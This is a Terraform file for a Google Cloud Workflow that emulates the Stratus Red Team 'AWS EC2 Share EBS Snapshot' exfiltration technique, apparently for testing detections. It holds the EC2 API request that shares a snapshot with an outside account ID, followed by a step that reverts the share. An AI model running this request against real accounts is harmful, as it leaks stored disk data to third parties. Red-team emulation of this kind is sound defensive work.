data "google_service_account" "workflows-to-cloudrun-sa" {
  account_id   = "workflows-to-cloudrun-sa"

}

resource "google_workflows_workflow" "workflow_to_invoke_aws-ec2-share-ebs-snapshot_attack" {
  name            = "aws-ec2-share-ebs-snapshot"
  description     = "A  workflow intended to match the functionality of the  Status Red Team attack technique 'AWS EC2 Share EBS Snapshot': https://stratus-red-team.cloud/attack-techniques/AWS/aws.exfiltration.ec2-share-ebs-snapshot/"
  service_account = data.google_service_account.workflows-to-cloudrun-sa.id
  project         = var.projectId
  source_contents = <<-EOF

######################################################################################
## Attack Description
######################################################################################

## This attack shares an EBS Snapshot with an external, fictitious AWS account, (012345678912)
## This module then reverts the share with the default user.

#####################################################################################
## Input
######################################################################################
##### INPUT: {"user":"user01"}
##### INPUT: {"user":"user02"}


######################################################################################
## User Agent
######################################################################################
#### Workflow executes with the User-Agent string: "AWS-Share-EBS-Snapshot-WORKFLOWEXECUTIONID"



######################################################################################
## Main Workflow Execution
######################################################################################
main:
  params: [args]
  steps:
    - assign:
        assign:
          - user: $${args.user}
          - projectID: $${sys.get_env("GOOGLE_CLOUD_PROJECT_ID")}  
    - getCloudRunURL:
        call: googleapis.run.v2.projects.locations.services.get
        args:
          name: '$${"projects/"+projectID+"/locations/us-central1/services/aws-proxy-app"}'
        result: appEndpoint 
    - ModifySnapshotAttribute:
        call: ModifySnapshotAttribute
        args:
            user: $${user}
            appEndpoint: $${appEndpoint.uri}
        result: response
    - RevertModifySnapshotAttribute:
        call: RevertModifySnapshotAttribute
        args:
            appEndpoint: $${appEndpoint.uri}
        result: revertResponse
    - return:
        return: $${response}


######################################################################################
## Submodules | Sub-Workflows
######################################################################################
ModifySnapshotAttribute:
  params: [user, appEndpoint]
  steps:  
    - ModifySnapshotAttribute:
        call: http.post
        args:
          url: '$${appEndpoint+"/submitRequest"}'
          auth:
              type: OIDC
          headers:
              User-Agent: "Derf-Suspect-Priv-Esc-Workflow"
          body:
              HOST: "ec2.us-east-1.amazonaws.com"
              REGION: "us-east-1"
              SERVICE: "ec2" 
              ENDPOINT: "https://ec2.us-east-1.amazonaws.com"
              BODY: "Action=ModifySnapshotAttribute&Version=2016-11-15&Attribute=createVolumePermission&OperationType=add&SnapshotId=${local.EBSSnapshotId}&UserId.1=012345678912"
              UA: '$${"AWS-Share-EBS-Snapshot=="+sys.get_env("GOOGLE_CLOUD_WORKFLOW_EXECUTION_ID")}'
              CONTENT: "application/x-www-form-urlencoded; charset=utf-8"
              USER: $${user}
              VERB: POST
        result: response

    - handle_result:
        switch:
          - condition: $${response.body.responseCode == 200}
            next: returnValidation
          - condition: $${response.body.responseCode == 403}
            next: permissionError
          - condition: $${response.body.responseCode == 400}
            next: error

    - returnValidation:
        return: 
          - $${response.body.responseBody}
          - $${response.body.responseCode}
          - "SUCCESS - AWS EC2 Share EBS Snapshot Attack"

    - permissionError:
        return: 
          - $${response.body.responseBody}
          - $${response.body.responseCode}
          - "FAILURE - AWS EC2 Share EBS Snapshot Attack | This is typically a permission error"
    - error:
        return: 
          - $${response.body.responseBody}
          - $${response.body.responseCode}
          - "FAILURE - AWS EC2 Share EBS Snapshot Attack"


RevertModifySnapshotAttribute:
  params: [appEndpoint]
  steps:  
    - RevertModifySnapshotAttribute:
        call: http.post
        args:
          url: '$${appEndpoint+"/submitRequest"}'
          auth:
              type: OIDC
          headers:
              User-Agent: "Derf-Suspect-Priv-Esc-Workflow"
          body:
              HOST: "ec2.us-east-1.amazonaws.com"
              REGION: "us-east-1"
              SERVICE: "ec2" 
              ENDPOINT: "https://ec2.us-east-1.amazonaws.com"
              BODY: "Action=ModifySnapshotAttribute&Version=2016-11-15&Attribute=createVolumePermission&OperationType=remove&SnapshotId=${local.EBSSnapshotId}&UserId.1=012345678912"
              CONTENT: "application/x-www-form-urlencoded; charset=utf-8"
              VERB: POST
        result: response

  EOF

}